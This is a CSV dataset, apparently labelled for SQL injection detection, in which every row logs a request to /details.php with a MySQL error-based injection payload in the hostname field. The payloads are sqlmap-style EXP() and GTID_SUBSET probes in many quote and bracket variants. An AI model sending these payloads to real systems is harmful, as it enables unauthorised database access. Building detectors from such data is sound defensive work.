full_url,event_time,hostname,injection
/details.php?prod=5&type=%3F,1681395265.345296,"192.168.43.6') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND ('MGSP' LIKE 'MGSP",1
/details.php?prod=5&type=%3F,1681395265.349594,"192.168.43.6')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND (('Eune' LIKE 'Eune",1
/details.php?prod=5&type=%3F,1681395265.408761,"192.168.43.6'))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND ((('nHrD' LIKE 'nHrD",1
/details.php?prod=5&type=%3F,1681395265.413191,"192.168.43.6%' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND 'lPlL%'='lPlL",1
/details.php?prod=5&type=%3F,1681395265.417977,"192.168.43.6' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND 'BkYU' LIKE 'BkYU",1
/details.php?prod=5&type=%3F,1681395265.423253,"192.168.43.6"") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND (""BYkz""=""BYkz",1
/details.php?prod=5&type=%3F,1681395265.485063,"192.168.43.6"")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND ((""zvXR""=""zvXR",1
/details.php?prod=5&type=%3F,1681395265.490529,"192.168.43.6""))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND (((""DqOt""=""DqOt",1
/details.php?prod=5&type=%3F,1681395265.495421,"192.168.43.6"" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND ""tbDB""=""tbDB",1
/details.php?prod=5&type=%3F,1681395265.500133,"192.168.43.6"") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND (""XmUw"" LIKE ""XmUw",1
/details.php?prod=5&type=%3F,1681395265.559446,"192.168.43.6"")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND ((""HLON"" LIKE ""HLON",1
/details.php?prod=5&type=%3F,1681395265.563705,"192.168.43.6""))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND (((""mvyJ"" LIKE ""mvyJ",1
/details.php?prod=5&type=%3F,1681395265.569486,"192.168.43.6"" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND ""ktFr"" LIKE ""ktFr",1
/details.php?prod=5&type=%3F,1681395265.574367,"192.168.43.6 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- xUkI",1
/details.php?prod=5&type=%3F,1681395265.630333,"192.168.43.6 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))# AKWU",1
/details.php?prod=5&type=%3F,1681395265.634778,"192.168.43.6' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) OR 'JYGf'='jlxB",1
/details.php?prod=5&type=%3F,1681395265.639699,"192.168.43.6') WHERE 9686=9686 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- TxUg",1
/details.php?prod=5&type=%3F,1681395265.645115,"192.168.43.6"") WHERE 8145=8145 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- VwLd",1
/details.php?prod=5&type=%3F,1681395265.649891,"192.168.43.6) WHERE 5692=5692 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- WPbP",1
/details.php?prod=5&type=%3F,1681395265.655069,"192.168.43.6' WHERE 5318=5318 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- uIie",1
/details.php?prod=5&type=%3F,1681395265.660872,"192.168.43.6"" WHERE 9027=9027 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- BeEZ",1
/details.php?prod=5&type=%3F,1681395265.672591,"192.168.43.6 WHERE 1153=1153 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- KDTl",1
/details.php?prod=5&type=%3F,1681395265.676983,"192.168.43.6'||(SELECT 0x5a636841 WHERE 8601=8601 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)))||'",1
/details.php?prod=5&type=%3F,1681395265.68175,"192.168.43.6'||(SELECT 0x47475a47 FROM DUAL WHERE 5969=5969 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)))||'",1
/details.php?prod=5&type=%3F,1681395265.686446,"192.168.43.6'+(SELECT 0x4e7a7359 WHERE 1209=1209 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)))+'",1
/details.php?prod=5&type=%3F,1681395265.691039,"192.168.43.6||(SELECT 0x517a6a54 FROM DUAL WHERE 6646=6646 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)))||",1
/details.php?prod=5&type=%3F,1681395265.695555,"192.168.43.6||(SELECT 0x71526272 WHERE 7480=7480 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)))||",1
/details.php?prod=5&type=%3F,1681395265.700407,"192.168.43.6+(SELECT HYoP WHERE 1308=1308 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)))+",1
/details.php?prod=5&type=%3F,1681395265.70535,"192.168.43.6+(SELECT 0x47455a59 WHERE 6168=6168 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)))+",1
/details.php?prod=5&type=%3F,1681395265.710044,"192.168.43.6')) AS FxtS WHERE 7941=7941 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- VpyJ",1
/details.php?prod=5&type=%3F,1681395265.714708,"192.168.43.6"")) AS AzlR WHERE 8282=8282 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- xsKC",1
/details.php?prod=5&type=%3F,1681395265.719327,"192.168.43.6)) AS GHOP WHERE 3395=3395 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- IcER",1
/details.php?prod=5&type=%3F,1681395265.724126,"192.168.43.6') AS YRKr WHERE 9938=9938 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- hEla",1
/details.php?prod=5&type=%3F,1681395265.728703,"192.168.43.6"") AS WIof WHERE 8633=8633 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- HMWn",1
/details.php?prod=5&type=%3F,1681395265.732864,"192.168.43.6) AS oDNP WHERE 4379=4379 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- MvMv",1
/details.php?prod=5&type=%3F,1681395265.737422,"192.168.43.6` WHERE 7685=7685 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- YTim",1
/details.php?prod=5&type=%3F,1681395265.741973,"192.168.43.6`) WHERE 1639=1639 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))-- tlLs",1
/details.php?prod=5&type=%3F,1681395265.7474,"192.168.43.6`=`192.168.43.6` OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND `192.168.43.6`=`192.168.43.6",1
/details.php?prod=5&type=%3F,1681395265.755837,"192.168.43.6""=""192.168.43.6"" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)) AND ""192.168.43.6""=""192.168.43.6",1
/details.php?prod=5&type=%3F,1681395265.759898,"192.168.43.6]-(SELECT 0 WHERE 5685=5685 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x)))|[192.168.43.6",1
/details.php?prod=5&type=%3F,1681395265.764508,"192.168.43.6' IN BOOLEAN MODE) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(8227=8227,1))),0x717a626271,0x78))x))#",1
/details.php?prod=5&type=%3F,1681395265.769433,"192.168.43.6) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- ivyF",1
/details.php?prod=5&type=%3F,1681395265.7735,"192.168.43.6') AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- Wdvy",1
/details.php?prod=5&type=%3F,1681395265.777978,"192.168.43.6' AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- wIVQ",1
/details.php?prod=5&type=%3F,1681395265.783524,"192.168.43.6"" AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- qLJu",1
/details.php?prod=5&type=%3F,1681395265.788783,"192.168.43.6) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND (3165=3165",1
/details.php?prod=5&type=%3F,1681395265.803094,"192.168.43.6)) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND ((6292=6292",1
/details.php?prod=5&type=%3F,1681395265.878164,"192.168.43.6))) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND (((1387=1387",1
/details.php?prod=5&type=%3F,1681395265.884592,"192.168.43.6 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)",1
/details.php?prod=5&type=%3F,1681395265.896937,"192.168.43.6') AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND ('HrJB'='HrJB",1
/details.php?prod=5&type=%3F,1681395265.954823,"192.168.43.6')) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND (('IrUD'='IrUD",1
/details.php?prod=5&type=%3F,1681395265.959209,"192.168.43.6'))) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND ((('Tuqs'='Tuqs",1
/details.php?prod=5&type=%3F,1681395266.024082,"192.168.43.6' AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND 'wQEk'='wQEk",1
/details.php?prod=5&type=%3F,1681395266.02918,"192.168.43.6') AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND ('HALS' LIKE 'HALS",1
/details.php?prod=5&type=%3F,1681395266.034358,"192.168.43.6')) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND (('ZeHe' LIKE 'ZeHe",1
/details.php?prod=5&type=%3F,1681395266.039673,"192.168.43.6'))) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND ((('Txks' LIKE 'Txks",1
/details.php?prod=5&type=%3F,1681395266.095766,"192.168.43.6%' AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND 'YfUG%'='YfUG",1
/details.php?prod=5&type=%3F,1681395266.099956,"192.168.43.6' AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND 'RHBS' LIKE 'RHBS",1
/details.php?prod=5&type=%3F,1681395266.105554,"192.168.43.6"") AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND (""tUwq""=""tUwq",1
/details.php?prod=5&type=%3F,1681395266.10989,"192.168.43.6"")) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND ((""hFdp""=""hFdp",1
/details.php?prod=5&type=%3F,1681395266.115472,"192.168.43.6""))) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND (((""xEVG""=""xEVG",1
/details.php?prod=5&type=%3F,1681395266.172701,"192.168.43.6"" AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND ""tpzW""=""tpzW",1
/details.php?prod=5&type=%3F,1681395266.176716,"192.168.43.6"") AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND (""cXDv"" LIKE ""cXDv",1
/details.php?prod=5&type=%3F,1681395266.180858,"192.168.43.6"")) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND ((""aLLz"" LIKE ""aLLz",1
/details.php?prod=5&type=%3F,1681395266.186823,"192.168.43.6""))) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND (((""IFTd"" LIKE ""IFTd",1
/details.php?prod=5&type=%3F,1681395266.19251,"192.168.43.6"" AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND ""uVmB"" LIKE ""uVmB",1
/details.php?prod=5&type=%3F,1681395266.197061,"192.168.43.6 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- lpNc",1
/details.php?prod=5&type=%3F,1681395266.201508,"192.168.43.6 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)# eEAX",1
/details.php?prod=5&type=%3F,1681395266.20597,"192.168.43.6' AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) OR 'qiVj'='ecdS",1
/details.php?prod=5&type=%3F,1681395266.210181,"192.168.43.6') WHERE 2900=2900 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- MTMe",1
/details.php?prod=5&type=%3F,1681395266.214066,"192.168.43.6"") WHERE 1685=1685 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- WCun",1
/details.php?prod=5&type=%3F,1681395266.218464,"192.168.43.6) WHERE 7163=7163 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- UieM",1
/details.php?prod=5&type=%3F,1681395266.223288,"192.168.43.6' WHERE 4304=4304 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- SEEx",1
/details.php?prod=5&type=%3F,1681395266.227736,"192.168.43.6"" WHERE 9322=9322 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- RIHf",1
/details.php?prod=5&type=%3F,1681395266.232388,"192.168.43.6 WHERE 2216=2216 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- cZHG",1
/details.php?prod=5&type=%3F,1681395266.236713,"192.168.43.6'||(SELECT 0x484c7779 WHERE 8116=8116 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174))||'",1
/details.php?prod=5&type=%3F,1681395266.241038,"192.168.43.6'||(SELECT 0x48436853 FROM DUAL WHERE 1475=1475 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174))||'",1
/details.php?prod=5&type=%3F,1681395266.245928,"192.168.43.6'+(SELECT 0x5a425a6a WHERE 1273=1273 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174))+'",1
/details.php?prod=5&type=%3F,1681395266.249631,"192.168.43.6||(SELECT 0x79646361 FROM DUAL WHERE 4759=4759 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174))||",1
/details.php?prod=5&type=%3F,1681395266.254514,"192.168.43.6||(SELECT 0x75725555 WHERE 7673=7673 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174))||",1
/details.php?prod=5&type=%3F,1681395266.258657,"192.168.43.6+(SELECT VgZi WHERE 8855=8855 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174))+",1
/details.php?prod=5&type=%3F,1681395266.262916,"192.168.43.6+(SELECT 0x735a5262 WHERE 3316=3316 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174))+",1
/details.php?prod=5&type=%3F,1681395266.26724,"192.168.43.6')) AS wwps WHERE 4495=4495 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- BnqS",1
/details.php?prod=5&type=%3F,1681395266.271184,"192.168.43.6"")) AS itVE WHERE 4973=4973 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- fLvZ",1
/details.php?prod=5&type=%3F,1681395266.277065,"192.168.43.6)) AS EKrH WHERE 6646=6646 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- QjFX",1
/details.php?prod=5&type=%3F,1681395266.281204,"192.168.43.6') AS kyRV WHERE 8627=8627 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- MbCP",1
/details.php?prod=5&type=%3F,1681395266.286052,"192.168.43.6"") AS tVyU WHERE 9412=9412 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- Lgak",1
/details.php?prod=5&type=%3F,1681395266.290525,"192.168.43.6) AS uGsO WHERE 9329=9329 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- pqKv",1
/details.php?prod=5&type=%3F,1681395266.29471,"192.168.43.6` WHERE 8537=8537 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- EqAO",1
/details.php?prod=5&type=%3F,1681395266.299092,"192.168.43.6`) WHERE 5606=5606 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)-- zGvy",1
/details.php?prod=5&type=%3F,1681395266.303032,"192.168.43.6`=`192.168.43.6` AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND `192.168.43.6`=`192.168.43.6",1
/details.php?prod=5&type=%3F,1681395266.307426,"192.168.43.6""=""192.168.43.6"" AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174) AND ""192.168.43.6""=""192.168.43.6",1
/details.php?prod=5&type=%3F,1681395266.311547,"192.168.43.6]-(SELECT 0 WHERE 4119=4119 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174))|[192.168.43.6",1
/details.php?prod=5&type=%3F,1681395266.315269,"192.168.43.6' IN BOOLEAN MODE) AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(1174=1174,1))),0x717a626271),1174)#",1
/details.php?prod=5&type=%3F,1681395266.319869,"192.168.43.6) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063)-- muqE",1
/details.php?prod=5&type=%3F,1681395266.32409,"192.168.43.6') OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063)-- ZpOh",1
/details.php?prod=5&type=%3F,1681395266.328584,"192.168.43.6' OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063)-- ZZQM",1
/details.php?prod=5&type=%3F,1681395266.334373,"192.168.43.6"" OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063)-- bPKc",1
/details.php?prod=5&type=%3F,1681395266.352647,"192.168.43.6) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND (5817=5817",1
/details.php?prod=5&type=%3F,1681395266.358959,"192.168.43.6)) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND ((8023=8023",1
/details.php?prod=5&type=%3F,1681395266.368841,"192.168.43.6))) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND (((7175=7175",1
/details.php?prod=5&type=%3F,1681395266.43095,"192.168.43.6 OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063)",1
/details.php?prod=5&type=%3F,1681395266.438487,"192.168.43.6') OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND ('dmYD'='dmYD",1
/details.php?prod=5&type=%3F,1681395266.443264,"192.168.43.6')) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND (('YrEQ'='YrEQ",1
/details.php?prod=5&type=%3F,1681395266.5019,"192.168.43.6'))) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND ((('icEC'='icEC",1
/details.php?prod=5&type=%3F,1681395266.506703,"192.168.43.6' OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND 'sKtJ'='sKtJ",1
/details.php?prod=5&type=%3F,1681395266.511673,"192.168.43.6') OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND ('gBlo' LIKE 'gBlo",1
/details.php?prod=5&type=%3F,1681395266.516058,"192.168.43.6')) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND (('DoyL' LIKE 'DoyL",1
/details.php?prod=5&type=%3F,1681395266.582688,"192.168.43.6'))) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND ((('RNdj' LIKE 'RNdj",1
/details.php?prod=5&type=%3F,1681395266.587011,"192.168.43.6%' OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND 'lgtk%'='lgtk",1
/details.php?prod=5&type=%3F,1681395266.592524,"192.168.43.6' OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND 'jllZ' LIKE 'jllZ",1
/details.php?prod=5&type=%3F,1681395266.596809,"192.168.43.6"") OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND (""NJbr""=""NJbr",1
/details.php?prod=5&type=%3F,1681395266.602636,"192.168.43.6"")) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND ((""TQXw""=""TQXw",1
/details.php?prod=5&type=%3F,1681395266.608682,"192.168.43.6""))) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND (((""oDOr""=""oDOr",1
/details.php?prod=5&type=%3F,1681395266.612907,"192.168.43.6"" OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND ""VXUB""=""VXUB",1
/details.php?prod=5&type=%3F,1681395266.617621,"192.168.43.6"") OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND (""pyqD"" LIKE ""pyqD",1
/details.php?prod=5&type=%3F,1681395266.622396,"192.168.43.6"")) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND ((""aIuO"" LIKE ""aIuO",1
/details.php?prod=5&type=%3F,1681395266.62718,"192.168.43.6""))) OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND (((""zETB"" LIKE ""zETB",1
/details.php?prod=5&type=%3F,1681395266.633951,"192.168.43.6"" OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) AND ""RLCU"" LIKE ""RLCU",1
/details.php?prod=5&type=%3F,1681395266.638351,"192.168.43.6 OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063)-- jEIf",1
/details.php?prod=5&type=%3F,1681395266.653211,"192.168.43.6 OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063)# Dhfb",1
/details.php?prod=5&type=%3F,1681395266.658939,"192.168.43.6' OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063) OR 'nbAd'='Fzki",1
/details.php?prod=5&type=%3F,1681395266.664183,"192.168.43.6') WHERE 6410=6410 OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(8063=8063,1))),0x717a626271),8063)-- ewJa",1
